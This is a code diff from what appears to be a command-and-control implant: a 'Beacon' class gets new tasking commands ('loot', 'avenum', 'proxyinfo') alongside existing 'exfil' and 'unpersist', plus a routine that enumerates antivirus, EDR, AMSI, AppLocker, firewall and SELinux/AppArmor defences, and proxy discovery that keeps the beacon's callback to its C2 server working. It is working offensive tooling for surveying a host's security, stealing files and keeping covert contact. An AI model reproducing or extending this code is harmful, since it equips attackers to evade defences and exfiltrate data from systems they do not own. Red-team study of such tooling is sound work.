+                    capture_output=True, text=True, timeout=5,
+                )
+                provider_count = sum(1 for l in r.stdout.splitlines()
+                                     if l.strip().startswith("HKEY"))
+                findings.append(("AMSI", "audit",
+                                 f"{provider_count} providers"))
+            except Exception:
+                pass
+
+            # Check AppLocker
+            try:
+                r = subprocess.run(
+                    ["powershell", "-NoProfile", "-Command",
+                     "(Get-AppLockerPolicy -Effective).RuleCollections.Count"],
+                    capture_output=True, text=True, timeout=10,
+                )
+                if r.returncode == 0 and r.stdout.strip():
+                    cnt = r.stdout.strip()
+                    findings.append(("AppLocker", "policy",
+                                     f"{cnt} rule collections"))
+            except Exception:
+                pass
+
+        else:
+            # Linux: check running processes
+            try:
+                r = subprocess.run(
+                    ["ps", "axo", "comm"], capture_output=True,
+                    text=True, timeout=10,
+                )
+                procs = set(r.stdout.strip().splitlines())
+                for proc_name, display, cat in self._AV_PROCS_LINUX:
+                    if proc_name in procs:
+                        findings.append((display, cat, "running"))
+            except Exception:
+                pass
+
+            # Check iptables rules count
+            try:
+                r = subprocess.run(
+                    ["iptables", "-L", "-n", "--line-numbers"],
+                    capture_output=True, text=True, timeout=10,
+                )
+                if r.returncode == 0:
+                    rules = sum(1 for l in r.stdout.splitlines()
+                                if l and not l.startswith("Chain")
+                                and not l.startswith("num"))
+                    findings.append(("iptables", "fw", f"{rules} rules"))
+            except Exception:
+                pass
+
+            # Check SELinux
+            try:
+                r = subprocess.run(
+                    ["getenforce"], capture_output=True, text=True, timeout=5,
+                )
+                if r.returncode == 0:
+                    findings.append(("SELinux", "policy",
+                                     r.stdout.strip().lower()))
+            except Exception:
+                pass
+
+            # Check AppArmor
+            try:
+                aa = Path("/sys/kernel/security/apparmor/profiles")
+                if aa.exists():
+                    count = sum(1 for _ in aa.read_text().splitlines())
+                    findings.append(("AppArmor", "policy",
+                                     f"{count} profiles"))
+            except Exception:
+                pass
+
+        if not findings:
+            return "No AV/EDR/SIEM tools detected (limited enumeration)"
+
+        lines = [f"{'Tool':<35} {'Category':<10} {'Status':<20}",
+                 "-" * 65]
+        for name, cat, status in findings:
+            lines.append(f"{name:<35} {cat:<10} {status:<20}")
+        lines.append(f"\n{len(findings)} security tool(s) detected on "
+                      f"{platform.node()} ({system})")
+        return "\n".join(lines)
 
     # ── ARP table ──
 
@@ -1205,6 +2072,16 @@ class Beacon:
                     output = f"Downloaded {dl['filename']} ({dl['size']} bytes)"
                     result_data = dl
 
+            elif cmd == "loot":
+                dl = self._exec_loot(args)
+                if "error" in dl:
+                    status = "error"
+                    output = dl["error"]
+                else:
+                    fc = dl.get("files", 1)
+                    output = f"Looted {dl['filename']} ({dl['size']} bytes, {fc} files)"
+                    result_data = dl
+
             elif cmd == "exfil":
                 output = "Exfil scan triggered"
                 logger.info("Exfil tasking received")
@@ -1220,6 +2097,12 @@ class Beacon:
 
             elif cmd == "unpersist":
                 output = self._exec_unpersist(args)
+
+            elif cmd == "proxyinfo":
+                output = self._exec_proxyinfo()
+
+            elif cmd == "avenum":
+                output = self._exec_avenum()
 
             else:
                 status = "error"
@@ -1280,8 +2163,39 @@ class Beacon:
             else:
                 self._jittered_sleep()
 
+    def _init_proxy(self):
+        self._proxy_session = _HttpSession()
+
+        if self.proxy_mode == "none":
+            self._proxy_session.trust_env = False
+            logger.info("Proxy: disabled (direct connection)")
+            return
+
+        if self.proxy_mode == "manual" and self.proxy_url:
+            self._proxy_session.proxies = {
+                "http": self.proxy_url, "https": self.proxy_url,
+            }
+            logger.info("Proxy: manual — %s", self.proxy_url)
+            return
+
+        discovered = self._proxy.discover_all()
+        if discovered:
+            logger.info("Proxy: %s", self._proxy.summary())
+            non_pac = [p for p in discovered if not p.get("is_pac")]
+            if non_pac:
+                working = self._proxy.select_working(
+                    self.callback_url.rsplit("/", 1)[0], timeout=8)
+                if working:
+                    self._proxy_session.proxies = self._proxy.get_urllib_proxies()
+                    return
+            logger.info("Proxy: no working proxy found, trying direct")
+        else:
+            logger.info("Proxy: none discovered, using direct connection")
+        self._proxy_session.trust_env = True
+
     def start(self):
         self._running = True
+        self._init_proxy()
         self._thread = threading.Thread(
             target=self._beacon_loop, daemon=True, name="c2-beacon",
         )
